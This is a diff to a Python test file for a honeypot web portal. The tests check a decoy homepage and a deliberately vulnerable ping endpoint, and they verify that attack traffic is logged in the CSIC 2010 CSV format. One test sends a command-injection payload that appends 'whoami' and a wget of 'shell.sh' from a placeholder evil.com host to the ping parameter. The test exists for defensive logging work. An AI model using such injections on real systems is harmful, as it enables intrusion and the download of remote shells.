@@ -18,8 +18,8 @@ def test_web_index(client):
     """Kiểm tra trang chủ mồi nhử Web Portal"""
     res = client.get("/")
     assert res.status_code == 200
-    assert b"Cloud Gateway" in res.data
-    assert b"Network Diagnostic Tool" in res.data
+    assert b"NexusCloud Portal" in res.data
+    assert b"Command Injection" in res.data
 
 
 def test_sensitive_file_leak(client):
@@ -59,3 +59,35 @@ def test_vulnerable_ping_rce_endpoint(client):
         assert latest["full_session"].endswith(" ;")
         assert "whoami" in latest["commands"]
         assert "id" in latest["commands"]
+
+
+def test_csic_http_dataset_compatibility(client):
+    """Kiểm tra log HTTP xuất ra khớp 100% 17 cột của file csic_database.csv"""
+    from threat_intel.csic_logger import CSIC_CSV_FILE, CSIC_COLUMNS
+    import csv
+
+    # Gửi 1 request thường và 1 request tấn công
+    client.get("/")
+    client.get("/api/ping?host=127.0.0.1;whoami;wget%20http://evil.com/shell.sh")
+
+    # Kiểm tra file CSV
+    assert CSIC_CSV_FILE.exists()
+    with open(CSIC_CSV_FILE, "r", encoding="utf-8") as f:
+        reader = csv.reader(f)
+        header = next(reader)
+        assert header == CSIC_COLUMNS
+
+    # Kiểm tra API feed
+    feed_res = client.get("/api/feed/latest_csic_http")
+    assert feed_res.status_code == 200
+    data = feed_res.get_json()
+    assert "csic_record" in data
+    rec = data["csic_record"]
+    assert "Method" in rec
+    assert "URL" in rec
+    assert "lenght" in rec  # Typo chuẩn của CSIC 2010
+
+    # Kiểm tra export CSV endpoint
+    export_res = client.get("/api/export/csic_csv")
+    assert export_res.status_code == 200
+    assert export_res.mimetype == "text/csv"
